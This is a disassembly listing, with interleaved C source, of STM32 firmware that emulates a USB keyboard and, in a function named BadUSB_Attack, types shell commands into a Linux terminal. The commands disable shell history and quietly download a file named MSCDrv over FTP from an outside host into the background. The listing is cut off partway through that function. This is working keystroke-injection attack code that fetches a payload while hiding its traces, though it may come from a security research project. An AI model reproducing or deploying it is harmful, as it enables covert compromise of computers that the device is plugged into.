 800063a:	f000 f93f 	bl	80008bc <Convert2CapsMap>
	uint8_t pos = Map[ascii];
 800063e:	79fb      	ldrb	r3, [r7, #7]
 8000640:	3390      	adds	r3, #144	; 0x90
 8000642:	443b      	add	r3, r7
 8000644:	f813 3c88 	ldrb.w	r3, [r3, #-136]
 8000648:	f887 308f 	strb.w	r3, [r7, #143]	; 0x8f
	sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 800064c:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000650:	091b      	lsrs	r3, r3, #4
 8000652:	b2db      	uxtb	r3, r3
 8000654:	461a      	mov	r2, r3
 8000656:	4b13      	ldr	r3, [pc, #76]	; (80006a4 <Get_Single_Descriptor+0x94>)
 8000658:	5c9b      	ldrb	r3, [r3, r2]
 800065a:	b25a      	sxtb	r2, r3
 800065c:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000660:	f003 0307 	and.w	r3, r3, #7
 8000664:	2101      	movs	r1, #1
 8000666:	fa01 f303 	lsl.w	r3, r1, r3
 800066a:	b25b      	sxtb	r3, r3
 800066c:	4313      	orrs	r3, r2
 800066e:	b259      	sxtb	r1, r3
 8000670:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000674:	091b      	lsrs	r3, r3, #4
 8000676:	b2db      	uxtb	r3, r3
 8000678:	461a      	mov	r2, r3
 800067a:	b2c9      	uxtb	r1, r1
 800067c:	4b09      	ldr	r3, [pc, #36]	; (80006a4 <Get_Single_Descriptor+0x94>)
 800067e:	5499      	strb	r1, [r3, r2]
	if((pos&0x08) == 8)
 8000680:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000684:	f003 0308 	and.w	r3, r3, #8
 8000688:	2b00      	cmp	r3, #0
 800068a:	d006      	beq.n	800069a <Get_Single_Descriptor+0x8a>
		sent_buffer[0] |= 0x02;
 800068c:	4b05      	ldr	r3, [pc, #20]	; (80006a4 <Get_Single_Descriptor+0x94>)
 800068e:	781b      	ldrb	r3, [r3, #0]
 8000690:	f043 0302 	orr.w	r3, r3, #2
 8000694:	b2da      	uxtb	r2, r3
 8000696:	4b03      	ldr	r3, [pc, #12]	; (80006a4 <Get_Single_Descriptor+0x94>)
 8000698:	701a      	strb	r2, [r3, #0]
}
 800069a:	bf00      	nop
 800069c:	3790      	adds	r7, #144	; 0x90
 800069e:	46bd      	mov	sp, r7
 80006a0:	bd80      	pop	{r7, pc}
 80006a2:	bf00      	nop
 80006a4:	2000025c 	.word	0x2000025c
 80006a8:	0800d2a8 	.word	0x0800d2a8

080006ac <Get_Multi_Descriptor>:

/*Designed for shortcut key combinations to obtain data packets:
 * for simultaneously pressing multiple keys*/
void Get_Multi_Descriptor(uint8_t *array, int num){
 80006ac:	b580      	push	{r7, lr}
 80006ae:	b0a6      	sub	sp, #152	; 0x98
 80006b0:	af00      	add	r7, sp, #0
 80006b2:	6078      	str	r0, [r7, #4]
 80006b4:	6039      	str	r1, [r7, #0]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80006b6:	220f      	movs	r2, #15
 80006b8:	2100      	movs	r1, #0
 80006ba:	482a      	ldr	r0, [pc, #168]	; (8000764 <Get_Multi_Descriptor+0xb8>)
 80006bc:	f00c fdae 	bl	800d21c <memset>
	uint8_t Map[MapLen] = Map_Init;
 80006c0:	4a29      	ldr	r2, [pc, #164]	; (8000768 <Get_Multi_Descriptor+0xbc>)
 80006c2:	f107 030c 	add.w	r3, r7, #12
 80006c6:	4611      	mov	r1, r2
 80006c8:	2286      	movs	r2, #134	; 0x86
 80006ca:	4618      	mov	r0, r3
 80006cc:	f00c fdd2 	bl	800d274 <memcpy>
	Convert2CapsMap(Map);
 80006d0:	f107 030c 	add.w	r3, r7, #12
 80006d4:	4618      	mov	r0, r3
 80006d6:	f000 f8f1 	bl	80008bc <Convert2CapsMap>
	for(int i = 0; i < num; i++){
 80006da:	2300      	movs	r3, #0
 80006dc:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 80006e0:	e036      	b.n	8000750 <Get_Multi_Descriptor+0xa4>
		uint8_t pos = Map[array[i]];
 80006e2:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 80006e6:	687a      	ldr	r2, [r7, #4]
 80006e8:	4413      	add	r3, r2
 80006ea:	781b      	ldrb	r3, [r3, #0]
 80006ec:	3398      	adds	r3, #152	; 0x98
 80006ee:	443b      	add	r3, r7
 80006f0:	f813 3c8c 	ldrb.w	r3, [r3, #-140]
 80006f4:	f887 3093 	strb.w	r3, [r7, #147]	; 0x93
		sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 80006f8:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 80006fc:	091b      	lsrs	r3, r3, #4
 80006fe:	b2db      	uxtb	r3, r3
 8000700:	461a      	mov	r2, r3
 8000702:	4b18      	ldr	r3, [pc, #96]	; (8000764 <Get_Multi_Descriptor+0xb8>)
 8000704:	5c9b      	ldrb	r3, [r3, r2]
 8000706:	b25a      	sxtb	r2, r3
 8000708:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 800070c:	f003 0307 	and.w	r3, r3, #7
 8000710:	2101      	movs	r1, #1
 8000712:	fa01 f303 	lsl.w	r3, r1, r3
 8000716:	b25b      	sxtb	r3, r3
 8000718:	4313      	orrs	r3, r2
 800071a:	b259      	sxtb	r1, r3
 800071c:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 8000720:	091b      	lsrs	r3, r3, #4
 8000722:	b2db      	uxtb	r3, r3
 8000724:	461a      	mov	r2, r3
 8000726:	b2c9      	uxtb	r1, r1
 8000728:	4b0e      	ldr	r3, [pc, #56]	; (8000764 <Get_Multi_Descriptor+0xb8>)
 800072a:	5499      	strb	r1, [r3, r2]
		if((pos&0x08) == 8)
 800072c:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 8000730:	f003 0308 	and.w	r3, r3, #8
 8000734:	2b00      	cmp	r3, #0
 8000736:	d006      	beq.n	8000746 <Get_Multi_Descriptor+0x9a>
			sent_buffer[0] |= 0x02;
 8000738:	4b0a      	ldr	r3, [pc, #40]	; (8000764 <Get_Multi_Descriptor+0xb8>)
 800073a:	781b      	ldrb	r3, [r3, #0]
 800073c:	f043 0302 	orr.w	r3, r3, #2
 8000740:	b2da      	uxtb	r2, r3
 8000742:	4b08      	ldr	r3, [pc, #32]	; (8000764 <Get_Multi_Descriptor+0xb8>)
 8000744:	701a      	strb	r2, [r3, #0]
	for(int i = 0; i < num; i++){
 8000746:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 800074a:	3301      	adds	r3, #1
 800074c:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 8000750:	f8d7 2094 	ldr.w	r2, [r7, #148]	; 0x94
 8000754:	683b      	ldr	r3, [r7, #0]
 8000756:	429a      	cmp	r2, r3
 8000758:	dbc3      	blt.n	80006e2 <Get_Multi_Descriptor+0x36>
	}
}
 800075a:	bf00      	nop
 800075c:	bf00      	nop
 800075e:	3798      	adds	r7, #152	; 0x98
 8000760:	46bd      	mov	sp, r7
 8000762:	bd80      	pop	{r7, pc}
 8000764:	2000025c 	.word	0x2000025c
 8000768:	0800d2a8 	.word	0x0800d2a8

0800076c <SimulateKeyPress>:

void SimulateKeyPress(uint8_t ascii){
 800076c:	b580      	push	{r7, lr}
 800076e:	b082      	sub	sp, #8
 8000770:	af00      	add	r7, sp, #0
 8000772:	4603      	mov	r3, r0
 8000774:	71fb      	strb	r3, [r7, #7]
	//get key:ascii Descriptor
	Get_Single_Descriptor(ascii);
 8000776:	79fb      	ldrb	r3, [r7, #7]
 8000778:	4618      	mov	r0, r3
 800077a:	f7ff ff49 	bl	8000610 <Get_Single_Descriptor>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800077e:	220f      	movs	r2, #15
 8000780:	4903      	ldr	r1, [pc, #12]	; (8000790 <SimulateKeyPress+0x24>)
 8000782:	4804      	ldr	r0, [pc, #16]	; (8000794 <SimulateKeyPress+0x28>)
 8000784:	f008 fa50 	bl	8008c28 <USBD_CUSTOM_HID_SendReport>
}
 8000788:	bf00      	nop
 800078a:	3708      	adds	r7, #8
 800078c:	46bd      	mov	sp, r7
 800078e:	bd80      	pop	{r7, pc}
 8000790:	2000025c 	.word	0x2000025c
 8000794:	200003c0 	.word	0x200003c0

08000798 <SimulateKeyRelease>:

void SimulateKeyRelease(){
 8000798:	b580      	push	{r7, lr}
 800079a:	af00      	add	r7, sp, #0
	//set 0
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800079c:	220f      	movs	r2, #15
 800079e:	2100      	movs	r1, #0
 80007a0:	4804      	ldr	r0, [pc, #16]	; (80007b4 <SimulateKeyRelease+0x1c>)
 80007a2:	f00c fd3b 	bl	800d21c <memset>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80007a6:	220f      	movs	r2, #15
 80007a8:	4902      	ldr	r1, [pc, #8]	; (80007b4 <SimulateKeyRelease+0x1c>)
 80007aa:	4803      	ldr	r0, [pc, #12]	; (80007b8 <SimulateKeyRelease+0x20>)
 80007ac:	f008 fa3c 	bl	8008c28 <USBD_CUSTOM_HID_SendReport>
}
 80007b0:	bf00      	nop
 80007b2:	bd80      	pop	{r7, pc}
 80007b4:	2000025c 	.word	0x2000025c
 80007b8:	200003c0 	.word	0x200003c0

080007bc <SimulateKeyStroke>:

void SimulateKeyStroke(uint8_t ascii){
 80007bc:	b580      	push	{r7, lr}
 80007be:	b082      	sub	sp, #8
 80007c0:	af00      	add	r7, sp, #0
 80007c2:	4603      	mov	r3, r0
 80007c4:	71fb      	strb	r3, [r7, #7]
	SimulateKeyPress(ascii);
 80007c6:	79fb      	ldrb	r3, [r7, #7]
 80007c8:	4618      	mov	r0, r3
 80007ca:	f7ff ffcf 	bl	800076c <SimulateKeyPress>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 80007ce:	2023      	movs	r0, #35	; 0x23
 80007d0:	f000 fe1a 	bl	8001408 <HAL_Delay>
	SimulateKeyRelease();
 80007d4:	f7ff ffe0 	bl	8000798 <SimulateKeyRelease>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 80007d8:	2023      	movs	r0, #35	; 0x23
 80007da:	f000 fe15 	bl	8001408 <HAL_Delay>
}
 80007de:	bf00      	nop
 80007e0:	3708      	adds	r7, #8
 80007e2:	46bd      	mov	sp, r7
 80007e4:	bd80      	pop	{r7, pc}
	...

080007e8 <SimulateShortcutKey>:

void SimulateShortcutKey(uint8_t *array, int num){
 80007e8:	b580      	push	{r7, lr}
 80007ea:	b082      	sub	sp, #8
 80007ec:	af00      	add	r7, sp, #0
 80007ee:	6078      	str	r0, [r7, #4]
 80007f0:	6039      	str	r1, [r7, #0]
	Get_Multi_Descriptor(array, num);
 80007f2:	6839      	ldr	r1, [r7, #0]
 80007f4:	6878      	ldr	r0, [r7, #4]
 80007f6:	f7ff ff59 	bl	80006ac <Get_Multi_Descriptor>
	while((recv_buffer[0]&0x02) != 0x02){
 80007fa:	e002      	b.n	8000802 <SimulateShortcutKey+0x1a>
		SimulateKeyStroke(128);
 80007fc:	2080      	movs	r0, #128	; 0x80
 80007fe:	f7ff ffdd 	bl	80007bc <SimulateKeyStroke>
	while((recv_buffer[0]&0x02) != 0x02){
 8000802:	4b0c      	ldr	r3, [pc, #48]	; (8000834 <SimulateShortcutKey+0x4c>)
 8000804:	781b      	ldrb	r3, [r3, #0]
 8000806:	f003 0302 	and.w	r3, r3, #2
 800080a:	2b00      	cmp	r3, #0
 800080c:	d0f6      	beq.n	80007fc <SimulateShortcutKey+0x14>
	}
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800080e:	220f      	movs	r2, #15
 8000810:	4909      	ldr	r1, [pc, #36]	; (8000838 <SimulateShortcutKey+0x50>)
 8000812:	480a      	ldr	r0, [pc, #40]	; (800083c <SimulateShortcutKey+0x54>)
 8000814:	f008 fa08 	bl	8008c28 <USBD_CUSTOM_HID_SendReport>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 8000818:	2023      	movs	r0, #35	; 0x23
 800081a:	f000 fdf5 	bl	8001408 <HAL_Delay>
	SimulateKeyRelease();
 800081e:	f7ff ffbb 	bl	8000798 <SimulateKeyRelease>
	HAL_Delay(ShortcutSlot); //Wait to avoid conflict
 8000822:	f44f 707a 	mov.w	r0, #1000	; 0x3e8
 8000826:	f000 fdef 	bl	8001408 <HAL_Delay>
}
 800082a:	bf00      	nop
 800082c:	3708      	adds	r7, #8
 800082e:	46bd      	mov	sp, r7
 8000830:	bd80      	pop	{r7, pc}
 8000832:	bf00      	nop
 8000834:	2000026c 	.word	0x2000026c
 8000838:	2000025c 	.word	0x2000025c
 800083c:	200003c0 	.word	0x200003c0

08000840 <SimulateKeyStrokes>:

void SimulateKeyStrokes(char *str, int len, int *cntNow){
 8000840:	b580      	push	{r7, lr}
 8000842:	b084      	sub	sp, #16
 8000844:	af00      	add	r7, sp, #0
 8000846:	60f8      	str	r0, [r7, #12]
 8000848:	60b9      	str	r1, [r7, #8]
 800084a:	607a      	str	r2, [r7, #4]
	for(*cntNow = 0; *cntNow < len; (*cntNow)++){
 800084c:	687b      	ldr	r3, [r7, #4]
 800084e:	2200      	movs	r2, #0
 8000850:	601a      	str	r2, [r3, #0]
 8000852:	e025      	b.n	80008a0 <SimulateKeyStrokes+0x60>
    	//Ensure func SimulateKeyStroke is executed in uppercase environment.
		if((recv_buffer[0]&0x02) != 0x02){
 8000854:	4b17      	ldr	r3, [pc, #92]	; (80008b4 <SimulateKeyStrokes+0x74>)
 8000856:	781b      	ldrb	r3, [r3, #0]
 8000858:	f003 0302 	and.w	r3, r3, #2
 800085c:	2b00      	cmp	r3, #0
 800085e:	d102      	bne.n	8000866 <SimulateKeyStrokes+0x26>
			SimulateKeyStroke(128);
 8000860:	2080      	movs	r0, #128	; 0x80
 8000862:	f7ff ffab 	bl	80007bc <SimulateKeyStroke>
    	}
		SimulateKeyStroke(str[*cntNow]);
 8000866:	687b      	ldr	r3, [r7, #4]
 8000868:	681b      	ldr	r3, [r3, #0]
 800086a:	461a      	mov	r2, r3
 800086c:	68fb      	ldr	r3, [r7, #12]
 800086e:	4413      	add	r3, r2
 8000870:	781b      	ldrb	r3, [r3, #0]
 8000872:	4618      	mov	r0, r3
 8000874:	f7ff ffa2 	bl	80007bc <SimulateKeyStroke>
		//Determine if RollBack is necessary
		if(NeedRollBack == 1){
 8000878:	4b0f      	ldr	r3, [pc, #60]	; (80008b8 <SimulateKeyStrokes+0x78>)
 800087a:	681b      	ldr	r3, [r3, #0]
 800087c:	2b01      	cmp	r3, #1
 800087e:	d10a      	bne.n	8000896 <SimulateKeyStrokes+0x56>
			NeedRollBack = 0;
 8000880:	4b0d      	ldr	r3, [pc, #52]	; (80008b8 <SimulateKeyStrokes+0x78>)
 8000882:	2200      	movs	r2, #0
 8000884:	601a      	str	r2, [r3, #0]
			(*cntNow)--;
 8000886:	687b      	ldr	r3, [r7, #4]
 8000888:	681b      	ldr	r3, [r3, #0]
 800088a:	1e5a      	subs	r2, r3, #1
 800088c:	687b      	ldr	r3, [r7, #4]
 800088e:	601a      	str	r2, [r3, #0]
			SimulateKeyStroke(129);
 8000890:	2081      	movs	r0, #129	; 0x81
 8000892:	f7ff ff93 	bl	80007bc <SimulateKeyStroke>
	for(*cntNow = 0; *cntNow < len; (*cntNow)++){
 8000896:	687b      	ldr	r3, [r7, #4]
 8000898:	681b      	ldr	r3, [r3, #0]
 800089a:	1c5a      	adds	r2, r3, #1
 800089c:	687b      	ldr	r3, [r7, #4]
 800089e:	601a      	str	r2, [r3, #0]
 80008a0:	687b      	ldr	r3, [r7, #4]
 80008a2:	681b      	ldr	r3, [r3, #0]
 80008a4:	68ba      	ldr	r2, [r7, #8]
 80008a6:	429a      	cmp	r2, r3
 80008a8:	dcd4      	bgt.n	8000854 <SimulateKeyStrokes+0x14>
		}
	}
}
 80008aa:	bf00      	nop
 80008ac:	bf00      	nop
 80008ae:	3710      	adds	r7, #16
 80008b0:	46bd      	mov	sp, r7
 80008b2:	bd80      	pop	{r7, pc}
 80008b4:	2000026c 	.word	0x2000026c
 80008b8:	2000027c 	.word	0x2000027c

080008bc <Convert2CapsMap>:
		SimulateKeyStroke(128);
		PrintRecvBuf(recv_buffer);  //print Keyboard LED Status
	}
}

void Convert2CapsMap(uint8_t LowerCaseMap[MapLen]){
 80008bc:	b480      	push	{r7}
 80008be:	b085      	sub	sp, #20
 80008c0:	af00      	add	r7, sp, #0
 80008c2:	6078      	str	r0, [r7, #4]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 80008c4:	2341      	movs	r3, #65	; 0x41
 80008c6:	73fb      	strb	r3, [r7, #15]
 80008c8:	e01a      	b.n	8000900 <Convert2CapsMap+0x44>
		LowerCaseMap[cnt] &= 0xf7;
 80008ca:	7bfb      	ldrb	r3, [r7, #15]
 80008cc:	687a      	ldr	r2, [r7, #4]
 80008ce:	4413      	add	r3, r2
 80008d0:	781a      	ldrb	r2, [r3, #0]
 80008d2:	7bfb      	ldrb	r3, [r7, #15]
 80008d4:	6879      	ldr	r1, [r7, #4]
 80008d6:	440b      	add	r3, r1
 80008d8:	f022 0208 	bic.w	r2, r2, #8
 80008dc:	b2d2      	uxtb	r2, r2
 80008de:	701a      	strb	r2, [r3, #0]
		LowerCaseMap[cnt+'a'-'A'] |= 0x08;
 80008e0:	7bfb      	ldrb	r3, [r7, #15]
 80008e2:	3320      	adds	r3, #32
 80008e4:	687a      	ldr	r2, [r7, #4]
 80008e6:	4413      	add	r3, r2
 80008e8:	781a      	ldrb	r2, [r3, #0]
 80008ea:	7bfb      	ldrb	r3, [r7, #15]
 80008ec:	3320      	adds	r3, #32
 80008ee:	6879      	ldr	r1, [r7, #4]
 80008f0:	440b      	add	r3, r1
 80008f2:	f042 0208 	orr.w	r2, r2, #8
 80008f6:	b2d2      	uxtb	r2, r2
 80008f8:	701a      	strb	r2, [r3, #0]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 80008fa:	7bfb      	ldrb	r3, [r7, #15]
 80008fc:	3301      	adds	r3, #1
 80008fe:	73fb      	strb	r3, [r7, #15]
 8000900:	7bfb      	ldrb	r3, [r7, #15]
 8000902:	2b5a      	cmp	r3, #90	; 0x5a
 8000904:	d9e1      	bls.n	80008ca <Convert2CapsMap+0xe>
	}
}
 8000906:	bf00      	nop
 8000908:	bf00      	nop
 800090a:	3714      	adds	r7, #20
 800090c:	46bd      	mov	sp, r7
 800090e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000912:	4770      	bx	lr

08000914 <InterruptTrap>:

void InterruptTrap(int *InterruptFlag){
 8000914:	b580      	push	{r7, lr}
 8000916:	b082      	sub	sp, #8
 8000918:	af00      	add	r7, sp, #0
 800091a:	6078      	str	r0, [r7, #4]
	if(*InterruptFlag == 1){
 800091c:	687b      	ldr	r3, [r7, #4]
 800091e:	681b      	ldr	r3, [r3, #0]
 8000920:	2b01      	cmp	r3, #1
 8000922:	d10f      	bne.n	8000944 <InterruptTrap+0x30>
		*InterruptFlag = 0;
 8000924:	687b      	ldr	r3, [r7, #4]
 8000926:	2200      	movs	r2, #0
 8000928:	601a      	str	r2, [r3, #0]
		//Trigger timer interrupt immediately by setting the value of the register
		TIM2->EGR |= TIM_EGR_UG;
 800092a:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 800092e:	695b      	ldr	r3, [r3, #20]
 8000930:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000934:	f043 0301 	orr.w	r3, r3, #1
 8000938:	6153      	str	r3, [r2, #20]
		//Second entry interrupt
		MX_TIM2_Init();
 800093a:	f000 fbbb 	bl	80010b4 <MX_TIM2_Init>
		HAL_TIM_Base_Start_IT(&htim2);
 800093e:	4803      	ldr	r0, [pc, #12]	; (800094c <InterruptTrap+0x38>)
 8000940:	f004 fb04 	bl	8004f4c <HAL_TIM_Base_Start_IT>
	}
}
 8000944:	bf00      	nop
 8000946:	3708      	adds	r7, #8
 8000948:	46bd      	mov	sp, r7
 800094a:	bd80      	pop	{r7, pc}
 800094c:	200002e4 	.word	0x200002e4

08000950 <TestHID>:

int TestHID(){
 8000950:	b580      	push	{r7, lr}
 8000952:	b082      	sub	sp, #8
 8000954:	af00      	add	r7, sp, #0
	char testStr[4] = {133, 133, 133, 133};
 8000956:	f04f 3385 	mov.w	r3, #2240120197	; 0x85858585
 800095a:	603b      	str	r3, [r7, #0]
	SimulateKeyStroke(133);
 800095c:	2085      	movs	r0, #133	; 0x85
 800095e:	f7ff ff2d 	bl	80007bc <SimulateKeyStroke>
	uint8_t PrevState = recv_buffer[0]&0x01;
 8000962:	4b0d      	ldr	r3, [pc, #52]	; (8000998 <TestHID+0x48>)
 8000964:	781b      	ldrb	r3, [r3, #0]
 8000966:	f003 0301 	and.w	r3, r3, #1
 800096a:	71fb      	strb	r3, [r7, #7]
	SimulateKeyStrokes(testStr, 4, &PrintCnt);
 800096c:	463b      	mov	r3, r7
 800096e:	4a0b      	ldr	r2, [pc, #44]	; (800099c <TestHID+0x4c>)
 8000970:	2104      	movs	r1, #4
 8000972:	4618      	mov	r0, r3
 8000974:	f7ff ff64 	bl	8000840 <SimulateKeyStrokes>
	uint8_t CurrState = recv_buffer[0]&0x01;
 8000978:	4b07      	ldr	r3, [pc, #28]	; (8000998 <TestHID+0x48>)
 800097a:	781b      	ldrb	r3, [r3, #0]
 800097c:	f003 0301 	and.w	r3, r3, #1
 8000980:	71bb      	strb	r3, [r7, #6]
	return PrevState == CurrState;
 8000982:	79fa      	ldrb	r2, [r7, #7]
 8000984:	79bb      	ldrb	r3, [r7, #6]
 8000986:	429a      	cmp	r2, r3
 8000988:	bf0c      	ite	eq
 800098a:	2301      	moveq	r3, #1
 800098c:	2300      	movne	r3, #0
 800098e:	b2db      	uxtb	r3, r3
}
 8000990:	4618      	mov	r0, r3
 8000992:	3708      	adds	r7, #8
 8000994:	46bd      	mov	sp, r7
 8000996:	bd80      	pop	{r7, pc}
 8000998:	2000026c 	.word	0x2000026c
 800099c:	20000278 	.word	0x20000278

080009a0 <BadUSB_Attack>:

void BadUSB_Attack(int stage){
 80009a0:	b5b0      	push	{r4, r5, r7, lr}
 80009a2:	b0c4      	sub	sp, #272	; 0x110
 80009a4:	af00      	add	r7, sp, #0
 80009a6:	f507 7388 	add.w	r3, r7, #272	; 0x110
 80009aa:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 80009ae:	6018      	str	r0, [r3, #0]
#if Target == FPGA
	if(stage == 0){
 80009b0:	f507 7388 	add.w	r3, r7, #272	; 0x110
 80009b4:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 80009b8:	681b      	ldr	r3, [r3, #0]
 80009ba:	2b00      	cmp	r3, #0
 80009bc:	f040 80a5 	bne.w	8000b0a <BadUSB_Attack+0x16a>
		uint8_t Terminal[3] = LinuxTerminal;
 80009c0:	4aa9      	ldr	r2, [pc, #676]	; (8000c68 <BadUSB_Attack+0x2c8>)
 80009c2:	f507 7386 	add.w	r3, r7, #268	; 0x10c
 80009c6:	6812      	ldr	r2, [r2, #0]
 80009c8:	4611      	mov	r1, r2
 80009ca:	8019      	strh	r1, [r3, #0]
 80009cc:	3302      	adds	r3, #2
 80009ce:	0c12      	lsrs	r2, r2, #16
 80009d0:	701a      	strb	r2, [r3, #0]
		char AttackStr0[256] = {'\0'};
 80009d2:	f507 7388 	add.w	r3, r7, #272	; 0x110
 80009d6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80009da:	2200      	movs	r2, #0
 80009dc:	601a      	str	r2, [r3, #0]
 80009de:	3304      	adds	r3, #4
 80009e0:	22fc      	movs	r2, #252	; 0xfc
 80009e2:	2100      	movs	r1, #0
 80009e4:	4618      	mov	r0, r3
 80009e6:	f00c fc19 	bl	800d21c <memset>
		strcat(AttackStr0, "set +o history\n");
 80009ea:	f107 0308 	add.w	r3, r7, #8
 80009ee:	4618      	mov	r0, r3
 80009f0:	f7ff fbec 	bl	80001cc <strlen>
 80009f4:	4603      	mov	r3, r0
 80009f6:	461a      	mov	r2, r3
 80009f8:	f107 0308 	add.w	r3, r7, #8
 80009fc:	4413      	add	r3, r2
 80009fe:	4a9b      	ldr	r2, [pc, #620]	; (8000c6c <BadUSB_Attack+0x2cc>)
 8000a00:	461c      	mov	r4, r3
 8000a02:	4615      	mov	r5, r2
 8000a04:	cd0f      	ldmia	r5!, {r0, r1, r2, r3}
 8000a06:	6020      	str	r0, [r4, #0]
 8000a08:	6061      	str	r1, [r4, #4]
 8000a0a:	60a2      	str	r2, [r4, #8]
 8000a0c:	60e3      	str	r3, [r4, #12]
		strcat(AttackStr0, "cd /home/user/Templates\n");
 8000a0e:	f107 0308 	add.w	r3, r7, #8
 8000a12:	4618      	mov	r0, r3
 8000a14:	f7ff fbda 	bl	80001cc <strlen>
 8000a18:	4603      	mov	r3, r0
 8000a1a:	461a      	mov	r2, r3
 8000a1c:	f107 0308 	add.w	r3, r7, #8
 8000a20:	4413      	add	r3, r2
 8000a22:	4a93      	ldr	r2, [pc, #588]	; (8000c70 <BadUSB_Attack+0x2d0>)
 8000a24:	461d      	mov	r5, r3
 8000a26:	4614      	mov	r4, r2
 8000a28:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8000a2a:	6028      	str	r0, [r5, #0]
 8000a2c:	6069      	str	r1, [r5, #4]
 8000a2e:	60aa      	str	r2, [r5, #8]
 8000a30:	60eb      	str	r3, [r5, #12]
 8000a32:	cc03      	ldmia	r4!, {r0, r1}
 8000a34:	6128      	str	r0, [r5, #16]
 8000a36:	6169      	str	r1, [r5, #20]
 8000a38:	7823      	ldrb	r3, [r4, #0]
 8000a3a:	762b      	strb	r3, [r5, #24]
		strcat(AttackStr0, "wget -q ftp://anonymous:@");
 8000a3c:	f107 0308 	add.w	r3, r7, #8
 8000a40:	4618      	mov	r0, r3
 8000a42:	f7ff fbc3 	bl	80001cc <strlen>
 8000a46:	4603      	mov	r3, r0
 8000a48:	461a      	mov	r2, r3
 8000a4a:	f107 0308 	add.w	r3, r7, #8
 8000a4e:	4413      	add	r3, r2
 8000a50:	4a88      	ldr	r2, [pc, #544]	; (8000c74 <BadUSB_Attack+0x2d4>)
 8000a52:	461d      	mov	r5, r3
 8000a54:	4614      	mov	r4, r2
 8000a56:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8000a58:	6028      	str	r0, [r5, #0]
 8000a5a:	6069      	str	r1, [r5, #4]
 8000a5c:	60aa      	str	r2, [r5, #8]
 8000a5e:	60eb      	str	r3, [r5, #12]
 8000a60:	cc03      	ldmia	r4!, {r0, r1}
 8000a62:	6128      	str	r0, [r5, #16]
 8000a64:	6169      	str	r1, [r5, #20]
 8000a66:	8823      	ldrh	r3, [r4, #0]
 8000a68:	832b      	strh	r3, [r5, #24]
		strcat(AttackStr0, File_Host_Addr);
 8000a6a:	f107 0308 	add.w	r3, r7, #8
 8000a6e:	4618      	mov	r0, r3
 8000a70:	f7ff fbac 	bl	80001cc <strlen>
 8000a74:	4603      	mov	r3, r0
 8000a76:	461a      	mov	r2, r3
 8000a78:	f107 0308 	add.w	r3, r7, #8
 8000a7c:	4413      	add	r3, r2
 8000a7e:	4a7e      	ldr	r2, [pc, #504]	; (8000c78 <BadUSB_Attack+0x2d8>)
 8000a80:	461c      	mov	r4, r3
 8000a82:	4613      	mov	r3, r2
 8000a84:	cb07      	ldmia	r3!, {r0, r1, r2}
 8000a86:	6020      	str	r0, [r4, #0]
 8000a88:	6061      	str	r1, [r4, #4]
 8000a8a:	60a2      	str	r2, [r4, #8]
 8000a8c:	881b      	ldrh	r3, [r3, #0]
 8000a8e:	81a3      	strh	r3, [r4, #12]
		strcat(AttackStr0, "/MSCDrv >/dev/null 2>&1 &\n");
 8000a90:	f107 0308 	add.w	r3, r7, #8
 8000a94:	4618      	mov	r0, r3
 8000a96:	f7ff fb99 	bl	80001cc <strlen>
 8000a9a:	4603      	mov	r3, r0
 8000a9c:	461a      	mov	r2, r3
 8000a9e:	f107 0308 	add.w	r3, r7, #8
 8000aa2:	4413      	add	r3, r2
 8000aa4:	4a75      	ldr	r2, [pc, #468]	; (8000c7c <BadUSB_Attack+0x2dc>)
 8000aa6:	461d      	mov	r5, r3
 8000aa8:	4614      	mov	r4, r2
 8000aaa:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8000aac:	6028      	str	r0, [r5, #0]
 8000aae:	6069      	str	r1, [r5, #4]
 8000ab0:	60aa      	str	r2, [r5, #8]
 8000ab2:	60eb      	str	r3, [r5, #12]
 8000ab4:	cc03      	ldmia	r4!, {r0, r1}
 8000ab6:	6128      	str	r0, [r5, #16]
 8000ab8:	6169      	str	r1, [r5, #20]
 8000aba:	8823      	ldrh	r3, [r4, #0]
 8000abc:	78a2      	ldrb	r2, [r4, #2]
 8000abe:	832b      	strh	r3, [r5, #24]
 8000ac0:	4613      	mov	r3, r2
 8000ac2:	76ab      	strb	r3, [r5, #26]
		strcat(AttackStr0, "exit\n");
 8000ac4:	f107 0308 	add.w	r3, r7, #8
